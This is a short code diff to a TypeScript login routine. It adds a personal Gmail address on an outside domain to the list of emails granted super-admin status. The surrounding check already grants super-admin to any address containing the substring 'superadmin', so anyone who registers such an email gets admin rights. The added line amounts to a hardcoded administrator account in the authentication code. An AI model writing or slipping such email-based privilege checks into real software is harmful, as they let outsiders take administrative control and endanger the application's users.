@@ -106,7 +106,8 @@ export async function resolveIdentities(userId: string): Promise<LoginContext> {
     lowerEmail.includes('superadmin') ||
     lowerEmail.includes('super_admin') ||
     lowerEmail === 'admin@goodnews.com' ||
-    lowerEmail === 'superadmin@goodnews.com'
+    lowerEmail === 'superadmin@goodnews.com' ||
+    lowerEmail === 'ixoralyon013@gmail.com'
 
   // 1. Check Super Admin / Base User Roles
   const roles = await db.select().from(userRole).where(eq(userRole.userId, userId))
